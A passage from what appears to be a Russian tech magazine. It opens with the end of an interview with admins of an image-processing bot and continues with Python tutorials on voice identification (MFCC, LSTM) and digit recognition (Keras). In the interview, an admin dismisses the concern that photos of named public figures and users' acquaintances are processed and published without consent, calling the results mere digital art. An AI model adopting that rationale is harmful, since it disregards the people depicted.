 — Судя по запросам в чате и в предложениях для раз мещения в галерее,
в русскоязычном сегменте лидируют [Катя] Кищук и ведущая «Орла и решки»
Регина [Тодоренко], далее следуют различные стримерши.
  — Тон кий вопрос про моральную сто рону про екта. Помимо пуб-
личных персон, пользовате ли наверняка загружают свои фотки
и фотки сво их знакомых. И зачастую, подоз реваю, модель не в
курсе, что ее фотку обрабаты вают и вык ладывают в пуб личный
доступ. Как администраторы канала отно сятся к это му? Не опа-
саетесь  судеб ных  преследований  со  сто роны  обижен ных
моделей?
 —  Пользователей  уведомляют  об  ответственности  и  правилах
перед началом использования бота. Если человек случайно выложил в чат
или галерею работ личную фотографию, то в любую минуту он может поп‐
росить удалить ее. Так же может поступить и девушка, при сутству ющая
на фотографии. Мы лишь предос тавляем ресурсы для использования прог‐
раммы. В любом случае программа далека от идеала: можно сказать, что
это «Фотошоп в два клика» с узкой направлен ностью, а фото, создаваемые
ею, — это цифровое искусство. В чате в целом домини рует мнение, что
людей увлекает процесс, а сами результаты в большинстве оцениваются
лишь со стороны эстетики. Возможно, у кого‐то результаты работы алгоритма
и вызывают какие‐то эмо ции сексуального характера, но опять же, судя
по чату, большинство принимают эти работы прос то как картинку, созданную
машиной, и понимают, что в ней нет души.
COVERSTORY





 Михаил Киреев
kireevmp@yandex.ru

МАШИННЫЙ
СЛУХ


КАК РАБОТАЕТ
ИДЕНТИФИКАЦИЯ
ЧЕЛОВЕКА
ПО ЕГО ГОЛОСУ





Ты, возможно, уже сталкивался с идентификацией по голосу.
Она используется в банках для идентификации по телефону,
для подтверждения  личности на  пунктах  контроля и  в
бытовых голосовых ассистентах, которые могут узнавать
хозяина. Знаешь ли ты, как это работа ет? Я решил разоб‐
раться в подробностях и сделать свою реализацию.


ХАРАКТЕРИСТИКИ ГОЛОСА
В первую очередь голос определяется его высотой. Высота — это основная
частота звука, вок руг которой строятся все дви жения голосовых свя зок. Эту
частоту легко почувствовать на слух: у кого‐то голос выше, звонче, а у кого‐то
ниже, басовитее.
  Другой важный параметр голоса — это его сила, количество энергии,
которую человек вкладывает в про изношение. От силы голоса зависит его
громкость, насыщенность.
  Еще одна характеристика — то, как голос переходит от одного звука к дру‐
гому. Этот параметр наиболее сложный для понимания и для вос приятия
на слух, хотя и самый точный — как и отпечаток паль ца.


ПРЕДОБРАБОТКА ЗВУКА
Человеческий голос — это не одинокая волна, это сумма множества отдель‐
ных частот, создаваемых голосовыми связ ками, а также их гармоники. Из‐за
этого в обработке сырых данных волны тяжело най ти закономерности голоса.
  Нам на помощь придет преобразова ние Фурье — математический способ
описать одну сложную звуковую волну спектрограммой, то есть набором мно‐
жества частот и амплитуд. Эта спектрог рамма содержит всю ключевую
информацию о звуке: так мы узнаем, какие в исходном голосе содержатся
частоты.
  Но преобразование Фурье — матема тическая функция, которая нацелена
на идеальный, неменяющийся звуковой сигнал, поэтому она требует прак‐
тической адаптации. Так что, вмес то того чтобы выделять час тоты из всей
записи сразу, эту запись мы поделим на небольшие отрезки, в течение
которых звук не будет меняться. И применим преобразование к каждому
из кусочков.





                    Спектрог рамма пения птицы


        WWW

                   Выб рать длительность блока несложно: в сред‐
                     нем один слог человек произносит за 70–80 мс,
                       а интонационно выделен ный вдвое дольше —
                     100–150 мс. Подробнее об этом можно почитать
                        в исследовании.


Следующий шаг — посчитать спектрог рамму вто рого поряд ка, то есть спек‐
трограмму от спектрограммы. Это нужно сделать, поскольку спектрограмма,
помимо основных частот, также содержит гармоники, которые не очень удоб‐
ны для анализа: они дуб лиру ют информа цию. Расположены эти гармоники
на равном друг от друга расстоянии, единственное их различие — умень‐
шение амплитуды.
  Давай посмотрим, как выглядит спектр монотонного звука. Начнем с вол‐
ны — синусоиды, которую изда ет, например, проводной телефон при наборе
номера.





Видно, что, кроме основного пика, на самом деле представляюще го сигнал,
есть меньшие пики, гармоники, которые полезной информации не несут.
Именно поэтому, прежде чем получать спектрог рамму второго поряд ка, пер‐
вую спектрограмму логарифмиру ют, чем получают пики схожего раз мера.





                 Логарифм спектрограммы синуса

Теперь, если мы будем искать спектрограмму второго порядка, или, как она
была названа, «кепстр» (анаграмма слова «спектр»), мы получим во много раз
более приличную картинку, которая полностью, одним пиком, отображает
нашу изначальную монотонную волну.





                               Кепстр

Одна из самых полезных особенностей нашего слуха — его нелинейная при‐
рода по отношению к вос приятию час тот. Путем долгих экспе риментов уче‐
ные выяснили, что эту закономерность можно не только легко вывести, но и
легко использовать.



                    Зависимость мела от герца

Эту новую величину наз вали мел, и она отлично отражает способность
человека распознавать раз ные частоты — чем выше частота зву ка, тем слож‐
нее ее различить.





                    График перевода герца в мелы

Теперь попробуем применить все это на практике.


ИДЕНТИФИКАЦИЯ С ИСПОЛЬЗОВАНИЕМ MFCC
Мы можем взять длительную запись голоса человека, посчитать кепстр
для каждого маленького учас тка и получить уни кальный отпечаток голоса
в каждый момент времени. Но этот отпечаток слишком большой для хранения
и анализа — он зависит от выбранной длины блока и может доходить до двух
тысяч чисел на каждые 100 мс. Поэто му из такого многообразия необходимо
извлечь определен ное количес тво приз наков. С этим нам поможет мел‐шка‐
ла.
  Мы можем выбрать определенные «участки слышимос ти», на которых про‐
суммируем все сигналы, причем количество этих участков равно количеству
необходимых признаков, а длины и границы участков зависят от мел‐шкалы.





       Вычисление мел‐час тотных кепс тральных коэффициентов

Вот мы и познакомились с мел‐частотными кепстральными коэффициентами
(MFCC). Количество признаков может быть произвольным, но чаще все го
варьируется от 20 до 40.
   Эти коэффициенты отлично отражают каждый «час тотный блок» голоса
в каждый момент времени, а зна чит, если обоб щить время, просуммировав
коэффициенты всех блоков, мы сможем получить голосовой отпе чаток
человека.


Тестирование метода
Давай скачаем несколько записей видео с YouTube, из которых извлечем
голос для наших экспериментов. Нам нужен чистый звук без шумов. Я выбрал
канал TED Talks.
   Скачаем несколь ко видеоза писей любым удоб ным способом, например
с помощью утилиты youtube‐dl. Она дос тупна через pip или через официаль‐
ный репозиторий Ubuntu или Debian. Я скачал три виде озаписи выс туплений:
двух женщин и одного муж чины.
  Затем преобразуем видео в аудио, соз даем нес колько кусков разной дли‐
ны без музыки или апло дисментов.


$ ffmpeg ‐ss 00:00:27.0 ‐i man1.webm ‐t 200 ‐vn man1.1.wav

Теперь разберемся с программой на Python 3. Нам понадобятся библиотеки
numpy для вычислений и librosa для обработки звука, которые можно уста‐
новить с помощью pip. Для тво его удобс тва все сложные вычисления коэф‐
фициентов упаковали в одну функцию librosa.feature.mfcc. Загрузим зву‐
ковую дорожку и извле чем характеристики голоса.


import librosa as lr
import numpy as np


SR = 16000 # Частота дискретизации


def process_audio(aname):
  audio, _ = lr.load(aname, sr=SR) # Загружаем трек в память


  # Извлекаем коэффициенты
  afs = lr.feature.mfcc(audio, # из нашего звука
                        sr=SR, # с частотой дискретизации 16 кГц
                        n_mfcc=34, # Извлекаем 34 параметра
                        n_fft=2048) # Используем блоки в 125 мс
  # Суммируем все коэффициенты по времени
  # Отбрасываем два первых, так как они не слышны человеку и
содержат шум
  afss = np.sum(afs[2:], axis=‐1)


  # Нормализуем их
  afss = afss / np.max(np.abs(afss))


  return afss


def confidence(x, y):
  return np.sum((x ‐ y)**2) # Евклидово расстояние
  # Меньше — лучше


# Загружаем несколько аудиодорожек
woman21 = process_audio("woman2.1.wav")
woman22 = process_audio("woman2.2.wav")
woman11 = process_audio("woman1.1.wav")
woman12 = process_audio("woman1.2.wav")


# Сравниваем коэффициенты на близость
print('same', confidence(woman11, woman12))
print('same', confidence(woman21, woman22))
print('diff', confidence(woman11, woman21))
print('diff', confidence(woman11, woman22))
print('diff', confidence(woman12, woman21))
print('diff', confidence(woman12, woman22))

Результат:



  same 0.08918786797751492
  same 0.04016324022920391
  diff 0.8353932676024817
  diff 0.5290006939899561
  diff 0.5996234966734799
  diff 0.9143384850090941


Идентификация работает пра виль но. Но мы можем улучшить наш алгоритм,
добавив фильтр тишины и пауз между сло вами и предложениями.


def filter_audio(audio):
  # Считаем энергию голоса для каждого блока в 125 мс
  apower = lr.amplitude_to_db(np.abs(lr.stft(audio, n_fft=2048)), ref
=np.max)


  # Суммируем энергию по каждой частоте, нормализуем
  apsums = np.sum(apower, axis=0)**2
  apsums ‐= np.min(apsums)
  apsums /= np.max(apsums)


  # Сглаживаем график, чтобы сохранить короткие пропуски и паузы,
убрать резкость
  apsums = np.convolve(apsums, np.ones((9,)), 'same')
  # Нормализуем снова
  apsums ‐= np.min(apsums)
  apsums /= np.max(apsums)


  # Устанавливаем порог в 35% шума над голосом
  apsums = np.array(apsums > 0.35, dtype=bool)


  # Удлиняем блоки каждый по 125 мс
  # до отдельных семплов (2048 в блоке)
  apsums = np.repeat(apsums, np.ceil(len(audio) / len(apsums)))[:len(
audio)]


  return audio[apsums] # Фильтруем!

Протестируем новую программу.



  same 0.07287868313339689
  same 0.07599075249316399
  diff 1.1107063027198296
  diff 0.9556985491806391
  diff 0.9212706723328299
  diff 1.019240307344966


Мы посчитали значения различных признаков.





Эти графики показывают, как наша программа сравнивает значения разных
признаков. Красным и зеленым цветами обоз начены коэффициенты, которые
были получены из голосов двух женщин: по две записи на каждую. Линии оди‐
накового цвета находятся близко друг к дру гу — голос одного и того же
человека. Линии разных цветов расположены дальше друг от дру га, поскольку
это голоса разных людей.
   Теперь срав ним мужской и женский голоса.



  same 0.07287868313339689
  same 0.1312549383658766
  diff 1.4336642787341562
  diff 1.5398833283440216
  diff 1.9443562070029585
  diff 1.6660100959317368





            Графики коэффициентов для мужчины и женщины

Здесь различия более выражены, это видно и на графике. Голос мужчины
более низкий: пики боль ше в начале гра фика и мень ше в конце.
   Этот алгоритм действительно работа ет, и работает хорошо. Главный его
недостаток — зависимость точности результата от шумов и длительности
записи. Если запись короче десяти секунд, точность стремительно убывает.


ИДЕНТИФИКАЦИЯ ГОЛОСА С ПОМОЩЬЮ НЕЙРОННЫХ СЕТЕЙ
Мы можем улучшить наш алгоритм с помощью нейронных сетей, которые
на таких задачах показывают невероятную эффективность. Используем биб‐
лиотеку Keras для создания модели нейронной сети.


import librosa as lr
import numpy as np


from keras.layers import Dense, LSTM, Activation
from keras.models import Sequential
from keras.optimizers import Adam


SR = 16000 # Частота дискретизации
LENGTH = 16 # Количество блоков за один проход нейронной сети
OVERLAP = 8 # Шаг в количестве блоков между обучающими семплами
FFT = 1024 # Длина блока (64 мс)


def prepare_audio(aname, target=False):
  # Загружаем и подготавливаем данные
  print('loading %s' % aname)
  audio, _ = lr.load(aname, sr=SR)
  audio = filter_audio(audio) # Убираем тишину и пробелы между
словами
  data = lr.stft(audio, n_fft=FFT).swapaxes(0, 1) # Извлекаем
спектрограмму
  samples = []


  for i in range(0, len(data) ‐ LENGTH, OVERLAP):
    samples.append(np.abs(data[i:i + LENGTH])) # Создаем обучающую
выборку


  results_shape = (len(samples), 1)
  results = np.ones(results_shape) if target else np.zeros(result
s_shape)
  return np.array(samples), results


# Список всех записей
voices = [("woman2.wav", True),
          ("woman2.1.wav", True),
          ("woman2.2.wav", True),
          ("woman2.3.wav", True),
          ("woman1.wav", False),
          ("woman1.1.wav", False),
          ("woman1.2.wav", False),
          ("woman1.3.wav", False),
          ("man1.1.wav", False),
          ("man1.2.wav", False),
          ("man1.3.wav", False)]


# Объединяем обучающие выборки
X, Y = prepare_audio(*voices[0])
for voice in voices[1:]:
  dx, dy = prepare_audio(*voice)
  X = np.concatenate((X, dx), axis=0)
  Y = np.concatenate((Y, dy), axis=0)
  del dx, dy


# Случайным образом перемешиваем все блоки
perm = np.random.permutation(len(X))
X = X[perm]
Y = Y[perm]


# Создаем модель
model = Sequential()
model.add(LSTM(128, return_sequences=True, input_shape=X.shape[1:]))
model.add(LSTM(64))
model.add(Dense(64))
model.add(Activation('tanh'))
model.add(Dense(16))
model.add(Activation('sigmoid'))
model.add(Dense(1))
model.add(Activation('hard_sigmoid'))


# Компилируем и обучаем модель
model.compile(Adam(lr=0.005), loss='binary_crossentropy', metrics=[
'accuracy'])
model.fit(X, Y, epochs=15, batch_size=32, validation_split=0.2)


# Тестируем полученную в итоге модель
print(model.evaluate(X, Y))
# Сохраняем модель для дальнейшего использования
model.save('model.hdf5')

В этой модели использует ся два слоя долгой краткосрочной памяти (Long
Short‐Term Memory), которые поз воляют нейронной сети анализи ровать
не только сам голос, его высоту и силу, но и его динамические параметры,
например переходы между звуками голоса.


Тестирование метода
Давай обучим модель и посмотрим на ее резуль таты.



  Epoch 1/20
  5177/5177 [====================] ‐ loss: 0.4099 ‐ acc: 0.8134 ‐
  val_loss: 0.2545 ‐ val_acc: 0.8973
  ...
  Epoch 20/20
  5177/5177 [====================] ‐ loss: 0.0360 ‐ acc: 0.9944 ‐
  val_loss: 0.2077 ‐ val_acc: 0.9807
  [0.18412712604838924, 0.9819283065512979]


Отлично! 98% точности — хороший результат. Пос мотрим статистику точ‐
ности по каждому отдельному человеку.



  woman1: 98.4%
  woman2: 99.0% ‐ цель
  man1:   98.4%


Нейронная сеть справляется прекрасно, преодо левая большинс тво помех:
шумы и ограничения по длине записи (нейронная сеть анализирует всего
по одной секунде записи за раз). Такой способ идентификации человека
наиболее перспективен и эффективен.


ВЫВОДЫ
Технологии распознавания человека по его голосу находятся только лишь
на стадии научных исследований и раз работок, и поэтому в открытом доступе
хороших и популярных решений нет. Одна ко в коммерческом секторе такие
программные продукты уже рас простра няются, чем облегчают работу сот‐
рудников кол‐центров, разработчиков умных домов. Теперь и ты можешь
использовать этот прием на работе или для своих про ектов.
COVERSTORY
  МАШИННОЕ
    ЗРЕНИЕ
   НА PYTHON





        ОБУЧАЕМ НЕЙРОСЕТЬ
        РАСПОЗНАВАТЬ ЦИФРЫ





Раньше капча с числами была отличным
способом отсеять ботов, а сейчас такая
разновидность уже почти не встре чается.
Думаю, ты и сам догадываешься, в чем
дело: нейросети научились распознавать           DmitrySpb79                                                                                                    IoT/Python Developer
такие капчи лучше нас. В этой статье мы           dmitryelj@gmail.com
посмотрим, как работа ет нейронная сеть
и как использовать Keras и Tensorﬂow, что‐
бы реализовать распозна вание цифр.


Для каждого примера я приведу код на Python 3.7. Ты можешь запустить его
и пос мотреть, как все это работает. Для запус ка примеров потребуется биб‐
лиотека Tensorﬂow. Установить ее мож но командой pip install tensor‐
flow‐gpu, если видеокарта поддерживает CUDA, в противном случае исполь‐
зуй команду pip install tensorflow. Вычис ления с CUDA в несколько раз
быстрее, так что, если твоя видеокарта их поддерживает, это сэкономит
немало вре мени. И не забудь уста новить наборы данных для обучения сети
командой pip install tensorflow‐datasets.


             INFO

                     Все приведен ные в этой статье примеры работа‐
                     ют полностью авто номно. Это важно, потому что
                     существуют различные онлайн‐сервисы AI, нап‐
                     ример компании Amazon, которые берут оплату
                        за каждый запрос. Создав и обучив собственную
                      нейронную сеть с помощью Python и Tensorﬂow,
                      ты  сможешь  использовать  ее  неограниченно
                      и независимо от какого‐либо провайдера.



КАК РАБОТАЕТ НЕЙРОННАЯ СЕТЬ
Как работает один нейрон? Сигналы со входов (1) суммируются (2), причем
каждый вход имеет свой «коэффициент передачи» — w. Затем к получив‐
шемуся результату применя ется «функция активации» (3).





                    Модель нейрона

Типы этой функции различны, она может быть:
 • прямоугольной (на выходе 0 или 1);
 • линейной;
 • в виде сигмоиды.

Еще в 1943 году Мак‐Каллок и Питтс доказали, что сеть из нейронов может
выпол нять различные операции. Но сна чала эту сеть нужно обучить — нас‐
троить коэффициенты w каждого нейрона так, чтобы сигнал передавался нуж‐
ным нам способом. Запрограммировать нейронную сеть и обучить ее с нуля
сложно, но, к счастью для нас, все необ ходимые библиотеки уже написаны.
Благодаря компактности языка Python все дей ствия можно запрограм‐
мировать в несколь ко строк кода.
   Рассмотрим простейшую нейросеть и научим ее выполнять функцию XOR.
Разумеется, вычисление XOR с помощью нейронной сети не име ет прак‐
тического смысла. Но именно оно поможет нам понять базовые принципы
обучения и использования нейросети и позволит по шагам прос ледить ее
работу. С сетями боль шей раз мернос ти это было бы слишком сложно и гро‐
моздко.


ПРОСТЕЙШАЯ НЕЙРОННАЯ СЕТЬ
Сначала нужно подключить необходимые биб лиоте ки, в нашем  случае
это tensorflow. Я также отклю чаю вывод отладочных сообщений и работу
с GPU, они нам не пригодятся. Для работы с массивами нам понадобится
библиотека numpy.


import os
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
os.environ["CUDA_VISIBLE_DEVICES"] = "‐1"


from tensorflow import keras
from tensorflow.keras import layers
from tensorflow.keras import Sequential
from tensorflow.keras.layers import Conv2D, MaxPooling2D, Flatten,
Dense, Dropout, Activation, BatchNormalization, AveragePooling2D
from tensorflow.keras.optimizers import SGD, RMSprop, Adam
import tensorflow_datasets as tfds  # pip install tensorflow‐datasets
import tensorflow as tf
import logging
import numpy as np


tf.logging.set_verbosity(tf.logging.ERROR)
tf.get_logger().setLevel(logging.ERROR)

Теперь мы готовы создать нейросеть. Благодаря Tensorﬂow на это понадо‐
бится все го лишь четыре строчки кода.


model = Sequential()
model.add(Dense(2, input_dim=2, activation='relu'))
model.add(Dense(1, activation='sigmoid'))
model.compile(loss='binary_crossentropy', optimizer=SGD(lr=0.1))

Мы создали модель ней ронной сети — класс Sequential — и добавили в нее
два слоя: входной и выходной. Такая сеть называ ется «многос лойный пер‐
цептрон» (multilayer perceptron), в общем виде она выглядит так.





                      Сеть multilayer perceptron

В нашем случае сеть имеет два входа (внеш ний слой), два нейрона во внут‐
реннем слое и один выход.
  Можно посмотреть, что у нас получилось:


print(model.summary())





                       Парамет ры сети

Обучение нейросети сос тоит в нахождении значений параметров этой сети.
Наша сеть имеет девять параметров. Чтобы обу чить ее, нам понадобится
исходный набор данных, в нашем случае это результаты работы функции XOR.


X = np.array([[0,0], [0,1], [1,0], [1,1]])
y = np.array([[0], [1], [1], [0]])
model.fit(X, y, batch_size=1, epochs=1000, verbose=0)

Функция fit запускает алго ритм обучения, которое у нас будет выполняться
тысячу раз, на каждой итерации параметры сети будут корректироваться.
Наша сеть небольшая, так что обучение пройдет быстро. После обучения
сетью уже можно пользовать ся:


print("Network test:")
print("XOR(0,0):", model.predict_proba(np.array([[0, 0]])))
print("XOR(0,1):", model.predict_proba(np.array([[0, 1]])))
print("XOR(1,0):", model.predict_proba(np.array([[1, 0]])))
print("XOR(1,1):", model.predict_proba(np.array([[1, 1]])))

Результат соответствует тому, чему сеть обучалась.



  Network test:
  XOR(0,0): [[0.00741202]]
  XOR(0,1): [[0.99845064]]
  XOR(1,0): [[0.9984376]]
  XOR(1,1): [[0.00741202]]


Мы можем вывести все значения найденных коэффициентов на экран.


# Parameters layer 1
W1 = model.get_weights()[0]
b1 = model.get_weights()[1]
# Parameters layer 2
W2 = model.get_weights()[2]
b2 = model.get_weights()[3]


print("W1:", W1)
print("b1:", b1)
print("W2:", W2)
print("b2:", b2)
print()

Результат:



  W1: [[ 2.8668058 ‐2.904025 ] [‐2.871452 2.9036295]]
  b1: [‐0.00128211 ‐0.00191825]
  W2: [[3.9633768] [3.9168582]]
  b2: [‐4.897212]


Внутренняя реализация функции model.predict_proba выглядит при мерно
так:


x_in = [0, 1]
# Input
X1 = np.array([x_in], "float32")
# First layer calculation
L1 = np.dot(X1, W1) + b1
# Relu activation function: y = max(0, x)
X2 = np.maximum(L1, 0)
# Second layer calculation
L2 = np.dot(X2, W2) + b2
# Sigmoid
output = 1 / (1 + np.exp(‐L2))

Рассмотрим ситуацию, когда на вход сети подали значения [0,1]:



  L1 = X1*W1 + b1 = [0*2.8668058 + 1*‐2.871452 + ‐0.0012821, 0*‐2.904025 +
  1*2.9036295 +  ‐0.00191825] = [‐2.8727343 2.9017112]


Функция активации ReLu (rectiﬁed linear unit) — это прос то замена отри‐
цательных элементов нулем.


X2 = np.maximum(L1, 0) = [0.  2.9017112]

Теперь найденные значения попада ют на второй слой.



  L2 = X2*W2 + b2 = 0*3.9633768 +2.9017112*3.9633768 + ‐4.897212 =
  6.468379


Наконец, в качестве выхода используется функция Sigmoid, которая при‐
водит значения к диапазону 0...1:


output = 1 / (1 + np.exp(‐L2)) = 0.99845064

Мы совершили обычные операции умножения и сложения матриц и получи ли
ответ: XOR(0,1) = 1.
  С этим примером на Python советую поэкспериментировать самос‐
тоятельно. Например, ты можешь менять чис ло нейронов во внутреннем
слое. Два нейрона, как в нашем случае, — это самый минимум, чтобы сеть
работала.
  Но алгоритм обучения, который используется в Keras, не иде ален: ней‐
росети не всегда удается обучиться за 1000 итераций, и результаты не всег‐
да верны.  Так,  Keras инициализиру ет началь ные значения  случайными
величинами, и при каждом запус ке результат может отличаться. Моя сеть
с двумя нейронами успешно обучалась лишь в 20% слу чаев. Неправильная
работа сети выглядит примерно так:



  XOR(0,0): [[0.66549516]]
  XOR(0,1): [[0.66549516]]
  XOR(1,0): [[0.66549516]]
  XOR(1,1): [[0.00174837]]


Но это не страшно. Если видишь, что ней ронная сеть во время обучения
не выдает правильных результатов, алгоритм обучения можно запустить
еще раз. Правильно обученную сеть потом можно использовать без огра‐
ничений.
  Можно сделать сеть поумнее: использовать четыре нейрона вмес то двух,
для этого достаточно заменить строчку кода model.add(Dense(2,  in‐
put_dim=2, activation='relu')) на model.add(Dense(4, input_dim=2,
activation='relu')). Такая сеть обучается уже в 60% случаев, а сеть
из шести нейронов обучается с первого раза с вероятностью 90%.
  Все параметры нейрон ной сети полностью определяются коэф фици ента‐
ми. Обучив сеть, можно записать парамет ры сети на диск, а потом исполь‐
зовать уже готовую обученную сеть. Этим мы будем активно пользоваться.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
  МАШИННОЕ ЗРЕНИЕ
         НА PYTHON
              ОБУЧАЕМ НЕЙРОСЕТЬ РАСПОЗНАВАТЬ
                                 ЦИФРЫ





РАСПОЗНАВАНИЕ ЦИФР — СЕТЬ MLP
Рассмотрим практическую  задачу, вполне клас сическую для нейронных
сетей, — распознавание цифр. Для этого мы возь мем уже извес тную нам
сеть multilayer perceptron, ту же самую, что мы исполь зовали для функции XOR.
В качестве входных данных будут выступать изображения 28 × 28 пикселей.
Такой размер выбран потому, что сущес твует уже готовая база рукопис ных
цифр MNIST, которая хра нится именно в таком формате.
  Для удобства разобь ем код на несколько функций. Первая часть —
это создание модели.


def mnist_make_model(image_w: int, image_h: int):
   # Neural network model
   model = Sequential()
   model.add(Dense(784, activation='relu', input_shape=(image_w*
image_h,)))
   model.add(Dense(10, activation='softmax'))
   model.compile(loss='categorical_crossentropy', optimizer=RMSprop()
, metrics=['accuracy'])
   return model

На вход сети будет подаваться image_w*image_h зна чений — в нашем слу чае
это 28 × 28 = 784. Количество нейронов внутреннего слоя такое же и рав‐
но 784.
  С распознаванием цифр есть одна осо бенность. Как мы видели в пре‐
дыдущем примере, выход нейросети может лежать в диапазоне 0…1, а нам
нужно распознавать цифры от 0 до 9. Как быть? Что бы распознавать цифры,
мы создаем сеть с десятью выходами, и единица будет на выходе, соответс‐
твующем нужной цифре.





                    Сеть для рас позна вания цифр

Структура отдельного нейрона нас толь ко прос та, что для его использования
даже не обязателен компьютер. Недавно ученые смогли реализовать ней‐
ронную сеть, аналогичную нашей, в виде кус ка стекла — такая сеть не требует
питания и вообще не содержит внутри ни одного электронного компонента.





                       «Аналоговая» нейросеть

Когда нейронная сеть соз дана, ее надо обучить. Для начала необходимо заг‐
рузить датасет MNIST и преобра зовать данные в нужный формат.
   У нас есть два блока данных: train и test — один служит для обучения,
второй для верификации результатов. Это общепринятая практика, обучать
и тестировать нейронную сеть желательно на разных наборах данных.


def mnist_mlp_train(model):
   (x_train, y_train), (x_test, y_test) = keras.datasets.mnist.load_d
ata()
   # x_train: 60000x28x28 array, x_test: 10000x28x28 array
   image_size = x_train.shape[1]
   train_data = x_train.reshape(x_train.shape[0], image_size*image_
size)
   test_data = x_test.reshape(x_test.shape[0], image_size*image_size)
   train_data = train_data.astype('float32')
   test_data = test_data.astype('float32')
   train_data /= 255.0
   test_data /= 255.0


   # encode the labels ‐ we have 10 output classes
   # 3 ‐> [0 0 0 1 0 0 0 0 0 0], 5 ‐> [0 0 0 0 0 1 0 0 0 0]
   num_classes = 10
   train_labels_cat = keras.utils.to_categorical(y_train, num_classes
)
   test_labels_cat = keras.utils.to_categorical(y_test, num_classes)


   print("Training the network...")
   t_start = time.time()


   # Start training the network
   model.fit(train_data, train_labels_cat, epochs=8, batch_size=64,
verbose=1, validation_data=(test_data, test_labels_cat))

Готовый код обучения сети:


model = mnist_make_model(image_w=28, image_h=28)
mnist_mlp_train(model)
model.save('mlp_digits_28x28.h5')

Создаем модель, обучаем ее и записываем результат в файл.





                        Обучение сети

На моем компьютере c Core i7 и видеокартой GeForce 1060 процесс занима‐
ет 18 секунд и 50 секунд с расчетами без GPU — почти втрое дольше. Так что,
если ты захочешь эксперимен тировать с нейронными сетями, хорошая виде‐
окарта весьма желательна.
   Теперь напишем функцию рас познавания картинки из файла —  то,
для чего эта сеть и создавалась. Для распознавания мы должны привес ти
картинку к такому же формату — черно‐белое изображение 28 на 28 пик‐
селей.


def mlp_digits_predict(model, image_file):
   image_size = 28
   img = keras.preprocessing.image.load_img(image_file, target_size=(
image_size, image_size), color_mode='grayscale')
   img_arr = np.expand_dims(img, axis=0)
   img_arr = 1 ‐ img_arr/255.0
   img_arr = img_arr.reshape((1, image_size*image_size))


   result = model.predict_classes([img_arr])
   return result[0]

Теперь использовать нейронную сеть довольно прос то. Я создал в Paint пять
изображений с разными цифрами и запустил код.


model = tf.keras.models.load_model('mlp_digits_28x28.h5')
print(mlp_digits_predict(model, 'digit_0.png'))
print(mlp_digits_predict(model, 'digit_1.png'))
print(mlp_digits_predict(model, 'digit_3.png'))
print(mlp_digits_predict(model, 'digit_8.png'))
print(mlp_digits_predict(model, 'digit_9.png'))





                        Примеры цифр

Результат, увы, неидеален: 0, 1, 3, 6 и 6. Нейросеть успешно распознала 0,
1 и 3, но спутала 8 и 9 с цифрой 6. Разумеется, можно изме нить число ней‐
ронов, число ите раций обучения. К тому же эти цифры не были рукописными,
так что стопроцентный результат нам никто не обещал.
   Вот такая нейронная сеть с дополнительным слоем и большим числом
нейронов корректно распознает цифру восемь, но все равно путает 8 и 9.


def mnist_make_model2(image_w: int, image_h: int):
   # Neural network model
   model = Sequential()
   model.add(Dense(1024, activation='relu', input_shape=(image_w*
image_h,)))
   model.add(Dropout(0.2))  # rate 0.2 ‐ set 20% of inputs to zero
   model.add(Dense(1024, activation='relu'))
   model.add(Dropout(0.2))
   model.add(Dense(10, activation='softmax'))
   model.compile(loss='categorical_crossentropy', optimizer=RMSprop()
,
            metrics=['accuracy'])
   return model

При желании можно обучать нейронную сеть и на своем наборе данных,
но для этого данных нуж но довольно много (MNIST содержит 60 тысяч
образцов цифр). Желающие могут поэкспериментировать самостоятельно,
а мы пойдем дальше и рас смотрим сверточные сети (CNN, Convolutional
Neural Network), более эффективные для рас позна вания изображений.


РАСПОЗНАВАНИЕ ЦИФР — СВЕРТОЧНАЯ СЕТЬ (CNN)
В предыдущем примере мы использовали изображение 28 × 28 как простой
одномерный массив из 784 цифр. Такой подход, в принципе, работает,
но начинает давать сбои, если изображение, например, сдвинуто. Достаточ‐
но в предыдущем примере сдвинуть цифру в угол картинки, и программа уже
не распознает ее.
  Сверточные сети в этом плане гораз до эффективнее — они используют
принцип свертки, по которо му так называ емое ядро (kernel) перемещается
вдоль изображения и выделяет ключевые эффекты на картинке, если они
есть. Затем полученный результат сообщается «обычной» ней ронной сети,
которая и выдает готовый результат.


def mnist_cnn_model():
   image_size = 28
   num_channels = 1  # 1 for grayscale images
   num_classes = 10  # Number of outputs
   model = Sequential()
   model.add(Conv2D(filters=32, kernel_size=(3,3), activation='relu',
            padding='same',
input_shape=(image_size, image_size, num_channels)))
   model.add(MaxPooling2D(pool_size=(2, 2)))
   model.add(Conv2D(filters=64, kernel_size=(3, 3), activation='relu'
,
            padding='same'))
   model.add(MaxPooling2D(pool_size=(2, 2)))
   model.add(Conv2D(filters=64, kernel_size=(3, 3), activation='relu'
,
            padding='same'))
   model.add(MaxPooling2D(pool_size=(2, 2)))
   model.add(Flatten())
   # Densely connected layers
   model.add(Dense(128, activation='relu'))
   # Output layer
   model.add(Dense(num_classes, activation='softmax'))
   model.compile(optimizer=Adam(), loss='categorical_crossentropy',
            metrics=['accuracy'])
   return model

Слой Conv2D отвечает за свертку входного изоб ражения с ядром 3 × 3, а слой
MaxPooling2D выполняет  downsampling — умень шение  размера  изоб‐
ражения. На выходе сети мы видим уже зна комый нам слой Dense, который
мы использовали ранее.
   Как и в предыдущем случае, сеть вначале надо обучить, и принцип здесь
тот же самый, за тем исклю чением, что мы работа ем с двумерными изоб‐
ражениями.


def mnist_cnn_train(model):
   (train_digits, train_labels), (test_digits, test_labels) = keras.
datasets.mnist.load_data()


   # Get image size
   image_size = 28
   num_channels = 1  # 1 for grayscale images


   # re‐shape and re‐scale the images data
   train_data = np.reshape(train_digits, (train_digits.shape[0],
image_size, image_size, num_channels))
   train_data = train_data.astype('float32') / 255.0
   # encode the labels ‐ we have 10 output classes
   # 3 ‐> [0 0 0 1 0 0 0 0 0 0], 5 ‐> [0 0 0 0 0 1 0 0 0 0]
   num_classes = 10
   train_labels_cat = keras.utils.to_categorical(train_labels, num_cl
asses)


   # re‐shape and re‐scale the images validation data
   val_data = np.reshape(test_digits, (test_digits.shape[0], image_
size, image_size, num_channels))
   val_data = val_data.astype('float32') / 255.0
   # encode the labels ‐ we have 10 output classes
   val_labels_cat = keras.utils.to_categorical(test_labels, num_cl
asses)


   print("Training the network...")
   t_start = time.time()


   # Start training the network
   model.fit(train_data, train_labels_cat, epochs=8, batch_size=64,
        validation_data=(val_data, val_labels_cat))


   print("Done, dT:", time.time() ‐ t_start)


   return model

